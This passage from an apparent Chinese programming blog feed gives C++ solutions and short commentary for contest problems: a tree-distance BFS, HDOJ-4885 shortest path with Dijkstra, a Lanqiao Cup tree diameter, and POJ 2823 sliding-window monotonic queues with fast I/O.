class="line"><span class="keyword">int</span> <span class="keyword">last</span>[N],d[N],d2[N],<span class="string">q[N]</span>;</div><div class="line"><span class="keyword">int</span> tot;</div><div class="line"></div><div class="line">void add(<span class="keyword">int</span> <span class="keyword">x</span>,<span class="keyword">int</span> <span class="keyword">y</span>,<span class="keyword">int</span> z)</div><div class="line">&#123;</div><div class="line">eg[++tot].go=<span class="keyword">y</span>;</div><div class="line">eg[tot].val=z;</div><div class="line">eg[tot].next=<span class="keyword">last</span>[<span class="keyword">x</span>];</div><div class="line"><span class="keyword">last</span>[<span class="keyword">x</span>]=tot;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void bfs(<span class="keyword">int</span> <span class="keyword">s</span>,<span class="keyword">int</span>* d)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> l=<span class="number">0</span>,r=<span class="number">1</span>,i;</div><div class="line"><span class="string">q[1]</span>=<span class="keyword">s</span>;d[<span class="keyword">s</span>]=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span> (l&lt;r)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> u=<span class="string">q[++l]</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="keyword">last</span>[u];i!=-<span class="number">1</span>;i=eg[i].next)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> v=eg[i].go;</div><div class="line"><span class="keyword">if</span> (d[v]==-<span class="number">1</span>)</div><div class="line">&#123;</div><div class="line"><span class="string">q[++r]</span>=v;</div><div class="line">d[v]=eg[i].val+d[u];</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> main()</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> n,i,p,<span class="keyword">y</span>,z;</div><div class="line"><span class="keyword">while</span> (scanf(<span class="string">"%d"</span>,&amp;n)!=EOF)</div><div class="line">&#123;</div><div class="line">tot=-<span class="number">1</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++) <span class="keyword">last</span>[i]=-<span class="number">1</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">2</span>;i&lt;=n;i++)</div><div class="line">&#123;</div><div class="line">scanf(<span class="string">"%d%d"</span>,&amp;<span class="keyword">y</span>,&amp;z);</div><div class="line">add(i,<span class="keyword">y</span>,z);</div><div class="line">add(<span class="keyword">y</span>,i,z);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++) d[i]=-<span class="number">1</span>;</div><div class="line">bfs(<span class="number">1</span>,d);</div><div class="line"><span class="keyword">for</span> (p=<span class="number">1</span>,i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line"><span class="keyword">if</span> (d[i]&gt;d[p]) p=i;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++) d[i]=-<span class="number">1</span>;</div><div class="line">bfs(p,d);</div><div class="line"><span class="keyword">for</span> (p=<span class="number">1</span>,i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line"><span class="keyword">if</span> (d[i]&gt;d[p]) p=i;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++) d2[i]=-<span class="number">1</span>;</div><div class="line">bfs(p,d2);</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line"><span class="keyword">printf</span>(<span class="string">"%d\n"</span>,max(d[i],d2[i]));</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>E  <a href="http://acm.hdu.edu.cn/showproblem.php?pid=4885" target="_blank" rel="noopener">HDOJ-4885</a><br>题意就是平面上有好多加油站<br>一个人要从学校回家<br>这个人有一辆满油的摩托车<br>跑到 L 距离时会用完油<br>在加油站加油每次都要加满<br>而且每次加油之前走的都是直线</p><p>模型也不难。<br>就是距离小于等于 L 的可以连边，然后丢进第一题的模板里跑。<br>唯一蛋疼的就是必须走“直线”，也就是可能被强迫加油。。。<br>于是我就不会了。。。但是听说 N^3 能过。。。<br>然后我试了几种：<br>1、加边的时候数一下到底穿过几个点。。。<br>2、n-1 个点里面同向的点只加最近的。<br>3、先保存一下距离满足条件的，再在这里面同向只加最近的。<br>1 过不了。。。2 估计我写挂了。。。3 62MS。。。<br>最差情况复杂度 O(N^3)<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1010</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> M=<span class="number">1006100</span>*<span class="number">2</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">1</span>&lt;&lt;<span class="number">29</span>;</div><div class="line"><span class="keyword">struct</span> edge</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> go,next,val;</div><div class="line">&#125;;</div><div class="line">edge eg[M];</div><div class="line"><span class="keyword">struct</span> point</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> x,y;</div><div class="line">&#125;;</div><div class="line">point sta[N];</div><div class="line"><span class="keyword">int</span> last[N],d[N],vp[N];</div><div class="line"><span class="keyword">long</span> <span class="keyword">long</span> vali[N];</div><div class="line"><span class="keyword">bool</span> done[N];</div><div class="line"><span class="keyword">int</span> tot;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">sqr</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> x*x;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></div><div class="line">&#123;</div><div class="line">eg[++tot].go=y;</div><div class="line">eg[tot].val=z;</div><div class="line">eg[tot].next=last[x];</div><div class="line">last[x]=tot;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> vali[i]&gt;vali[j];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> T,n,l,i,j,k;</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line"><span class="keyword">while</span> (T--)</div><div class="line">&#123;</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;l); n+=<span class="number">2</span>; tot=<span class="number">0</span>;</div><div class="line"><span class="built_in">memset</span>(last,<span class="number">0</span>,<span class="keyword">sizeof</span>(last));</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;sta[<span class="number">1</span>].x,&amp;sta[<span class="number">1</span>].y);</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;sta[<span class="number">2</span>].x,&amp;sta[<span class="number">2</span>].y);</div><div class="line"><span class="keyword">for</span> (i=<span class="number">3</span>;i&lt;=n;i++)</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;sta[i].x,&amp;sta[i].y);</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> tmp=<span class="number">0</span>,z;</div><div class="line"><span class="keyword">for</span> (j=i+<span class="number">1</span>;j&lt;=n;j++)</div><div class="line">&#123;</div><div class="line">vali[j]=sqr(sta[j].x-sta[i].x)+sqr(sta[j].y-sta[i].y);</div><div class="line"><span class="keyword">if</span> (vali[j]&gt;sqr(l)) vali[j]=<span class="number">-1</span>;</div><div class="line"><span class="keyword">else</span> vp[++tmp]=j;</div><div class="line">&#125;</div><div class="line">sort(vp+<span class="number">1</span>,vp+<span class="number">1</span>+tmp,cmp);</div><div class="line"><span class="keyword">for</span> (j=<span class="number">1</span>;j&lt;=tmp;j++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">for</span> (k=j+<span class="number">1</span>;k&lt;=tmp;k++)</div><div class="line"><span class="keyword">if</span> (<span class="number">1L</span>L*(sta[vp[k]].x-sta[i].x)*(sta[vp[j]].y-sta[i].y)</div><div class="line">==<span class="number">1L</span>L*(sta[vp[j]].x-sta[i].x)*(sta[vp[k]].y-sta[i].y)</div><div class="line">&amp;&amp;((<span class="number">1L</span>L*(sta[vp[k]].x-sta[i].x)*(sta[vp[j]].x-sta[i].x)&gt;<span class="number">0</span>)</div><div class="line">||(<span class="number">1L</span>L*(sta[vp[k]].y-sta[i].y)*(sta[vp[j]].y-sta[i].y)&gt;<span class="number">0</span>)))</div><div class="line">&#123;</div><div class="line">vali[vp[j]]=<span class="number">-1</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (vali[vp[j]]!=<span class="number">-1</span>) add(i,vp[j],<span class="number">1</span>),add(vp[j],i,<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">priority_queue&lt;pii,<span class="built_in">vector</span>&lt;pii&gt;,greater&lt;pii&gt; &gt; q;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++) d[i]=INF;</div><div class="line"><span class="built_in">memset</span>(done,<span class="number">0</span>,<span class="keyword">sizeof</span>(done));</div><div class="line">d[<span class="number">1</span>]=<span class="number">0</span>;</div><div class="line">q.push(make_pair(<span class="number">0</span>,<span class="number">1</span>));</div><div class="line"><span class="keyword">while</span> (!q.empty())</div><div class="line">&#123;</div><div class="line">pii u=q.top();</div><div class="line">q.pop();</div><div class="line"><span class="keyword">int</span> v=u.second;</div><div class="line"><span class="keyword">if</span> (done[v]) <span class="keyword">continue</span>;</div><div class="line">done[v]=<span class="number">1</span>;</div><div class="line"><span class="keyword">for</span> (i=last[v];i;i=eg[i].next)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> x=eg[i].go;</div><div class="line"><span class="keyword">if</span> (d[x]&gt;d[v]+eg[i].val)</div><div class="line">&#123;</div><div class="line">d[x]=d[v]+eg[i].val;</div><div class="line">q.push(make_pair(d[x],x));</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (d[<span class="number">2</span>]==INF) <span class="built_in">puts</span>(<span class="string">"impossible"</span>);</div><div class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,d[<span class="number">2</span>]<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>蓝桥杯 历届试题 大臣的旅费</title>
      <url>/blog/2016/03/03/lanqiao_dachen/</url>
      <content type="html"><![CDATA[<p>。。。其实题意就是树的直径。。。<br>感觉自己挺傻逼的。。。直径就懂 最远路就不懂。。。<br>求直径就不用说了吧。。。自己查去。。。</p><p>。。。莫名其妙写了个O(n)的DP。。。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">10010</span>;</div><div class="line"><span class="keyword">struct</span> edge</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> go,v,next;</div><div class="line">&#125;;</div><div class="line">edge eg[<span class="number">2</span>*N];</div><div class="line"><span class="keyword">int</span> last[N],fm[N],sm[N];</div><div class="line"><span class="comment">//fm[] first max 记儿子、孙子等到该节点的最远路 sm[] 次远路 </span></div><div class="line"><span class="comment">//当然，这两个值不能来自于同一个子树，因为不能重复经过结点</span></div><div class="line"><span class="keyword">int</span> tot=<span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></div><div class="line">&#123;</div><div class="line">eg[++tot].go=y;</div><div class="line">eg[tot].v=z;</div><div class="line">eg[tot].next=last[x];</div><div class="line">last[x]=tot;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> fa)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (last[x]==<span class="number">0</span>) <span class="keyword">return</span>;</div><div class="line"><span class="keyword">int</span> p=<span class="number">0</span>,q=<span class="number">0</span>,i;</div><div class="line"><span class="keyword">for</span> (i=last[x];i;i=eg[i].next)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> u=eg[i].go;</div><div class="line"><span class="keyword">if</span> (u==fa) <span class="keyword">continue</span>;</div><div class="line">dfs(u,x);</div><div class="line"><span class="keyword">if</span> (eg[i].v+fm[u]&gt;p)</div><div class="line">&#123;</div><div class="line">q=p;</div><div class="line">p=eg[i].v+fm[u];</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (eg[i].v+fm[u]&gt;q) q=eg[i].v+fm[u];</div><div class="line">&#125;</div><div class="line">fm[x]=p;sm[x]=q;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> n,i,x,y,z,ans;</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;n;i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;x,&amp;y,&amp;z);</div><div class="line">add(x,y,z);</div><div class="line">add(y,x,z);</div><div class="line">&#125;</div><div class="line">dfs(<span class="number">1</span>,<span class="number">0</span>);</div><div class="line">ans=<span class="number">-1</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line">ans=max(ans,fm[i]+sm[i]);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans*(ans+<span class="number">1</span>)/<span class="number">2</span>+ans*<span class="number">10</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>POJ 2823 //单调队列</title>
      <url>/blog/2016/01/15/poj2823/</url>
      <content type="html"><![CDATA[<p>选C++交<br>选C++交<br>选C++交<br>【重说三<br>因为是队里的专题训练。。。<br>所以我知道这题肯定是单调队列。。。<br>而且一看数据范围和时限。。。<br>12000ms 逗我？<br>随手一交。RE了。。。<br>再随手一交。尼玛！T了！！！<br>这怎么可能！！！<br>单调队列是 O(n) 啊！啊啊啊啊啊！！<br>然后再各种查资料查程序。。。<br>提交别人写的 AC 程序竟然还是TLE。。。<br>过了好几天（没错 好几天！）<br>跑到POJ的原题交了一下。<br>果然还是TLE了。。。<br>然后又开始搜各种搜。。。<br>直到发现这两个：<br><a href="http://blog.csdn.net/chl_3205/article/details/8706307" target="_blank" rel="noopener">http://blog.csdn.net/chl_3205/article/details/8706307</a><br><a href="http://blog.csdn.net/yihuikang/article/details/7771170" target="_blank" rel="noopener">http://blog.csdn.net/yihuikang/article/details/7771170</a><br>语言选到C++。。。果然 AC 了。。。<br>生无可恋的眼神 T^T<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;cstdio&gt;</span></div><div class="line"><span class="comment">#include &lt;cstring&gt;</span></div><div class="line"></div><div class="line">const <span class="keyword">int</span> N=<span class="number">1000010</span>;</div><div class="line"><span class="keyword">int</span> a[N],<span class="string">q[N]</span>,c[N];</div><div class="line"></div><div class="line"><span class="keyword">int</span>  main()</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> n,k,i,l,r;</div><div class="line">scanf(<span class="string">"%d%d"</span>,&amp;n,&amp;k);</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++) scanf(<span class="string">"%d"</span>,&amp;a[i]);</div><div class="line">l=<span class="number">1</span>;</div><div class="line">r=<span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=k;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">while</span> (<span class="string">q[r]</span>&gt;=a[i]&amp;&amp;r&gt;=l) r--;</div><div class="line">c[++r]=i;</div><div class="line"><span class="string">q[r]</span>=a[i];</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (;i&lt;=n;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"%d "</span>,<span class="string">q[l]</span>);</div><div class="line"><span class="keyword">while</span> (<span class="string">q[r]</span>&gt;=a[i]&amp;&amp;r&gt;=l) r--;</div><div class="line">c[++r]=i;</div><div class="line"><span class="string">q[r]</span>=a[i];</div><div class="line"><span class="keyword">if</span> (i-k&gt;=c[l]) l++;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"%d\n"</span>,<span class="string">q[l]</span>);</div><div class="line">l=<span class="number">1</span>;</div><div class="line">r=<span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=k;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">while</span> (<span class="string">q[r]</span>&lt;=a[i]&amp;&amp;r&gt;=l) r--;</div><div class="line">c[++r]=i;</div><div class="line"><span class="string">q[r]</span>=a[i];</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (;i&lt;=n;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"%d "</span>,<span class="string">q[l]</span>);</div><div class="line"><span class="keyword">while</span> (<span class="string">q[r]</span>&lt;=a[i]&amp;&amp;r&gt;=l) r--;</div><div class="line">c[++r]=i;</div><div class="line"><span class="string">q[r]</span>=a[i];</div><div class="line"><span class="keyword">if</span> (i-k&gt;=c[l]) l++;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"%d\n"</span>,<span class="string">q[l]</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这个实在是太诡异了。。。<br>一般情况下我都是认为 G++ 比 VC++ 靠谱的<br>【当然 MinGW 算是其中比较不靠谱的。。。<br>而且编译环节还都没有问题。。。</p><p>===============当天的更新===============<br>有学长告诉我这个是 IO 的问题  加了读入输出优化就可以过<br>然后我又去写了一下<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;cstdio&gt;</span></div><div class="line"><span class="comment">#include &lt;cstring&gt;</span></div><div class="line"></div><div class="line">const <span class="keyword">int</span> N=<span class="number">1000010</span>;</div><div class="line"><span class="keyword">int</span> a[N],<span class="string">q[N]</span>,c[N];</div><div class="line"></div><div class="line">void <span class="keyword">read</span>(<span class="keyword">int</span> &amp;<span class="keyword">x</span>)</div><div class="line">&#123;</div><div class="line">char c=getchar();</div><div class="line"><span class="keyword">x</span>=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span> (!(c&gt;=<span class="string">'0'</span>&amp;&amp;c&lt;=<span class="string">'9'</span>||c==<span class="string">'-'</span>)) c=getchar();</div><div class="line"><span class="keyword">int</span> f=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (c==<span class="string">'-'</span>)</div><div class="line">&#123;</div><div class="line">f=<span class="number">1</span>;</div><div class="line">c=getchar();</div><div class="line">&#125;</div><div class="line"><span class="keyword">while</span> (c&gt;=<span class="string">'0'</span>&amp;&amp;c&lt;=<span class="string">'9'</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">x</span>=<span class="keyword">x</span>*<span class="number">10</span>+c-<span class="string">'0'</span>;</div><div class="line">c=getchar();</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (f) <span class="keyword">x</span>=-<span class="keyword">x</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void <span class="keyword">write</span>(<span class="keyword">int</span> <span class="keyword">x</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">x</span>==<span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">putchar(<span class="string">'0'</span>);</div><div class="line"><span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">x</span>&lt;<span class="number">0</span>) putchar(<span class="string">'-'</span>),<span class="keyword">x</span>=-<span class="keyword">x</span>;</div><div class="line">char <span class="keyword">s</span>[<span class="number">20</span>];</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span> (<span class="keyword">x</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">s</span>[i++]=<span class="keyword">x</span>%10+<span class="string">'0'</span>;</div><div class="line"><span class="keyword">x</span>/=<span class="number">10</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">s</span>[i]=<span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> (i--;i&gt;=<span class="number">0</span>;i--) putchar(<span class="keyword">s</span>[i]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span>  main()</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> n,k,i,l,r;</div><div class="line"><span class="keyword">read</span>(n);</div><div class="line"><span class="keyword">read</span>(k);</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++) <span class="keyword">read</span>(a[i]);</div><div class="line">l=<span class="number">1</span>;</div><div class="line">r=<span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=k;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">while</span> (<span class="string">q[r]</span>&gt;=a[i]&amp;&amp;r&gt;=l) r--;</div><div class="line">c[++r]=i;</div><div class="line"><span class="string">q[r]</span>=a[i];</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (;i&lt;=n;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">write</span>(<span class="string">q[l]</span>);</div><div class="line">putchar(<span class="string">' '</span>);</div><div class="line"><span class="keyword">while</span> (<span class="string">q[r]</span>&gt;=a[i]&amp;&amp;r&gt;=l) 